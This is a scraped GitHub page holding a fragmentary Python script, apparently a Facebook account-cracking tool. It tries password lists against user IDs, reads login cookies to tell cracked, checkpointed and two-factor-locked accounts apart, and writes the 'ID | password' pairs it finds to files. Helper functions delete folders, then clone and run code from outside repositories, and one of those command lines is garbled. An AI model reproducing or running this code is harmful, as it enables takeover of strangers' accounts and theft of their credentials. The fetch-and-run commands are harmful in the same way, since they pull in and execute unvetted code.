...
Insights
 main 
OPEN_SOURCE/FUCK-SSK.py

SSK Add files via upload
 1 contributor
1185 lines (1066 sloc)  48.4 KB
#decode by : SSK
#coding=utf-8
#created by SSK
#team name hbf
#tottaly written by SSK
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
...
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mSSK \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mFACEEBOOK   \033[131m➟   \033[1;32m     https://www.facebook.com/profile.php?id=100090297134712   \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m -06                  \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32m WORLD                  \033[1;31m   │
...
def saprate():
    ...
    print('\033[1;32m Example /sdcard/SSK-81.txt')
...
def main():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════════')
    print("           \x1b[97m[\033[37;41m  WELCOME. TO SSK TOOL \033[0;m] ")
...
def File_creating():
    os.system(f"git clone https://github.com/-06/DUMP && cd DUMP && python DUMP.py")

def PROTECT():
    os.system(" rm -rf DATA_PROTECT && git clone https://github.com/SSK-06/DATA_PROTECT && cd DATA_PROTECT && python PROTECTOR.py")

def CYTHONIZER():
    os.system("rm -rf Cython_Changer && git clone https://github.com/SSK-06/Cython_Changer && cd Cython_Changer && python3 Run.py")


def BOTX():
    os.system("rm -rf BOT && git clone https://github.com/SSK-06/ BOT && cd BOTgit clone https://github.com/Hamii-king-06/ BOT && cd BOT && python3 Hamii.py")
...
def file_crack():
    ...
    linex()
    opt_method = input(f'CHOOSE SERVER {SSK} : ')
    os.system('clear')
    print(logo)
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/SSK_OK.txt\n[•] CP IDS SAVE : /sdcard/SSK_CP.txt')
...
def method1(ids,names,passlist,total_ids):
    ...
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[SSK 🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio SSK_OK.mp3")
                print('\r\033[1;32m[SSK-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/SSK_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    os.system("play-audio SSK_2F.mp3")
                    print('\r\033[1;35m[SSK-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('/sdcard/SSK_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio SSK_CP.mp3")
                    print('\r\033[1;31m[SSK-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('/sdcard/SSK_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
...
def method2(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio SSK_OK.mp3")
                print('\r\033[1;32m[SSK-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/SSK_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    os.system("play-audio SSK_2F.mp3")
                    print('\r\033[1;35m[SSK-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/SSK_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio SSK_CP.mp3")
                    print('\r\033[1;31m[SSK-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/SSK_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
...
def random_method(ids,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[SSK🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    os.system("play-audio SSK_OK.mp3")
                    print('\r\033[1;92m[SSK-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/SSK_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[24:39]
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        os.system("play-audio SSK_2F.mp3")
                        print('\r\033[1;95m[SSK-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/SSK_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                            ...
                            os.system("play-audio SSK_CP.mp3")
                            print('\r\033[1;94m[SSK-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/SSK_CP.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/SSK-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SSK🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
...
Blog
About
OPEN_SOURCE/FUCK-SSK.py at main · SURESHSINDHI/OPEN_SOURCE"
 https://github.com/sureshsindhi.py#:~:text=Skip%20to%20content,main%20%C2%B7%20JUTTBRAND/OPEN_SOURCE
